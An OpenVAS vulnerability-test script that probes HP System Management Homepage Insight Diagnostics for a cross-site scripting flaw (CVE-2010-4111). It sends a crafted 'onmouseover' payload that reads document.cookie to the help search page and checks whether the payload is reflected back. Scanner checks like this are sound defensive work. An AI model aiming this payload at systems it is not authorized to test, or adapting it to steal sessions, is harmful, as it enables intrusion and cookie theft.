###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_hp_smh_insight_diag_help_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# HP SMH Insight Diagnostics 'help/search.php?' Cross Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to inject arbitrary HTML code
  in the context of an affected site.
  Impact Level: Application";
tag_affected = "HP Insight Diagnostics Online Edition before 8.5.1.3712.";
tag_insight = "The flaw is caused due imporper validation of user supplied input via
  'query=onmouseover=' to the '/frontend2/help/search.php?', which allows
  attackers to execute arbitrary HTML and script code in a user's browser
  session in the context of an affected site.";
tag_solution = "Upgrade to 8.5.1.3712 or higher versions or refer vendor advisory for
  update, http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02652463";
tag_summary = "The host is running HP SMH with Insight Diagnostics and is prone
  to cross-site scripting vulnerability.";

if(description)
{
  script_id(902431);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)");
  script_cve_id("CVE-2010-4111");
  script_bugtraq_id(45420);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("HP SMH Insight Diagnostics 'help/search.php?' Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check HP SMH Insight Diagnostics is vulnerable to XSS Attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://marc.info/?l=bugtraq&amp;m=129245189832672&amp;w=2");
  script_xref(name : "URL" , value : "http://securitytracker.com/alerts/2010/Dec/1024897.html");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101636/PR10-11.txt");
  script_xref(name : "URL" , value : "http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02652463");
  exit(0);
}


include("http_func.inc");
include("openvas-https.inc");

## Default HTTPS port
hpsmhPort = 2381;
if(!get_port_state(hpsmhPort)){
  exit(0);
}

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Construct basic GET request
req1 = string ( "GET / HTTP/1.1\r\n", "Host: ", host, "\r\n",
                "User-Agent: HP SMH Insight Diagnostics XSS Test\r\n",
                "\r\n"
              );
rcvRes1 = https_req_get(port:hpsmhPort, request:req1);

## Confirm the application before trying the exploit
if(">HP System Management Homepage<" >< rcvRes1)
{
  ## Construct XSS GET Attack request
  attackPath = '/hpdiags/frontend2/help/search.php?query="onmouseover=' +
               '"alert(document.cookie);';
  req2 = string( "GET ", attackPath, " HTTP/1.1\r\n", "Host: ", host, "\r\n",
                 "User-Agent: Portale e-commerce SQL Injection Test\r\n",
                 "Cookie: Compaq-HMMD=0001-8a3348dc-f004-4dae-a746-211a6" +
                 "d70fd51-1292315018889768; HPSMH-browser-check=done for" +
                 " this session; curlocation-hpsmh_anonymous=; PHPSESSID=" +
                 "2389b2ac7c2fb11b7927ab6e54c43e64\r\n",
                 "\r\n");

  ## Receive the response
  rcvRes2 = https_req_get(port:hpsmhPort, request:req2);

  ## Check Attack pattern in the response
  if('="alert(document.cookie);"' >< rcvRes2){
    security_warning(hpsmhPort);
  }
}
